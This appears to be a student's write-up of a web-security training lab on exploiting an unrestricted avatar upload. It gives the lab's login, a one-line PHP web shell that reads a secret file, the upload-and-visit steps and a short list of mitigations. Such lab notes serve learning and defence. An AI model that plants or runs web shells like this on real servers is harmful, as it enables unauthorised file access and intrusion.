# Lab01 - Remote Code Execution Via Web Shell Upload

## Objective

Read the contents of:

```text
/home/carlos/secret
```

---

# Vulnerability Overview

The application allows unrestricted file uploads.

Uploaded files are stored inside a web-accessible directory and executed by PHP.

---

# Analysis

## Step 1

Login:

```text
wiener:peter
```

---

## Step 2

Go to avatar upload.

---

## Step 3

Create shell:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Save as:

```text
exploit.php
```

---

## Step 4

Upload file.

---

## Step 5

Visit:

```text
/files/avatars/exploit.php
```

---

Result:

Carlos's secret displayed.

Lab solved.

---

# Full Payload Used

### Payload 1

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

# Why It Works

```text
No Validation
        ↓
PHP File Stored
        ↓
PHP Executed
        ↓
RCE
```

---

# Personal Analysis & Testing Process

Normal images uploaded successfully.

No extension filtering observed.

Uploaded PHP shell and directly accessed it.

Execution confirmed.

---

# Mitigation

- Allowlist extensions
- Store outside web root
- Disable execution

---

# Related Theory

- 05-exploiting-unrestricted-file-uploads.md

---

# Key Learnings

Upload + Access + Execution = RCE